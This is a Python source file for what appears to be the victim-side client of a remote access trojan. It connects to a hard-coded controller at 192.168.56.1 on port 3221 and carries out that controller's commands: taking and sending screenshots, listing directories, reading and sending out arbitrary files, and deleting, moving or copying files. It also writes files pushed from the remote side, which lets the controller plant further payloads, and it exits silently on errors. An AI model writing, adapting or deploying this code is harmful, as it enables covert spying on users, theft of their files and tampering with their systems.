import socket
import base64
import pyautogui
import time
import subprocess
import os
import shutil
import sys


try:
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    DISCONNECT = "disconnect"
    HOST = "192.168.56.1"
    PORT = 3221

    client.connect((HOST, PORT))

    print("Connected To {} With The Port {}".format(HOST, PORT))
    msg = ""


except ConnectionResetError:
    sys.exit(0)

except ConnectionRefusedError:
    sys.exit(0)


try:
    while True:
        msg = client.recv(1024).decode("utf-8")

        if msg == "screenshot":
            pyautogui.screenshot("image.png")

            with open("image.png", "rb") as image_file:
                encode_string = base64.b64encode(image_file.read())

                client.send(bytes(encode_string))

            os.remove("image.png")

        elif msg == "remove":
            try:
                FileToRemove = client.recv(10000).decode("utf-8")
                os.remove(FileToRemove)
                client.send(bytes(f"The File : {FileToRemove} Removed!", "utf-8"))

            except FileNotFoundError:
                sys.exit(0)

        elif msg == "show":

            Files_list = subprocess.run("dir", shell=True, capture_output=True)
            List = Files_list.stdout.decode()
            client.send(bytes(List, "utf-8"))

            Continue = client.recv(1024).decode("utf-8")
            if Continue == "yes":
                FileName = client.recv(100000).decode("utf-8")

                try:
                    with open(FileName, "r") as file:
                        DataFile = file.read()
                        client.send(bytes(f"--------------\nData File:\n--------------\n{DataFile}\n--------------", "utf-8"))
                        file.close()

                except UnicodeDecodeError:
                    client.send(bytes("Cant Read Image File!", "utf-8"))

            elif Continue == "no":
                pass

        elif msg == "search":
            DirectoryPath = client.recv(10000).decode("utf-8")

            try:
                FilesNames = os.listdir(DirectoryPath)
                FilesInDirectory = []

                for file in FilesNames:
                    FilesInDirectory.append(file)

                else:
                    pass

                client.send(bytes("\n".join(FilesInDirectory), "utf-8"))

            except FileNotFoundError:
                client.send(bytes("Directory Not Found!", "utf-8"))

        elif msg == "read":
            FilePath = client.recv(1024).decode("utf-8")

            try:
                File = open(FilePath)
                Data = File.read()
                client.send(bytes(Data, "utf-8"))
                File.close()

            except PermissionError:
                client.send(bytes("Cant Read Folder!", "utf-8"))

            except FileNotFoundError:
                client.send(bytes("File Not Found!", "utf-8"))

            except UnicodeDecodeError:
                sys.exit(0)

            except UnicodeEncodeError:
                sys.exit(0)

        elif msg == "move":
            try:
                MoveFileSrc = client.recv(1024).decode("utf-8")
                MoveFileDst = client.recv(1024).decode("utf-8")

                shutil.move(src=MoveFileSrc, dst=MoveFileDst)
            except FileNotFoundError:
                pass

            except PermissionError:
                pass

            except shutil.Error:
                pass

        elif msg == "copy":
            try:
                CopyFileSrc = client.recv(1024).decode("utf-8")
                CopyFileDst = client.recv(1024).decode("utf-8")

                try:
                    shutil.copy(src=CopyFileSrc, dst=CopyFileDst)
                except shutil.SameFileError:
                    pass
            except FileNotFoundError:
                pass

        elif msg == "make":
            try:
                TheFileName = client.recv(1024).decode("utf-8")
                FileData = client.recv(500000)

                with open(TheFileName, "wb") as TheFile:
                    TheFile.write(base64.decodebytes(FileData))
            except FileNotFoundError:
                pass

        elif msg == "disconnect":
            sys.exit(0)

        else:
            pass


except ConnectionResetError:
    sys.exit(0)

except ConnectionRefusedError:
    sys.exit(0)

except ConnectionAbortedError:
    sys.exit(0)

except ConnectionError:
    sys.exit(0)
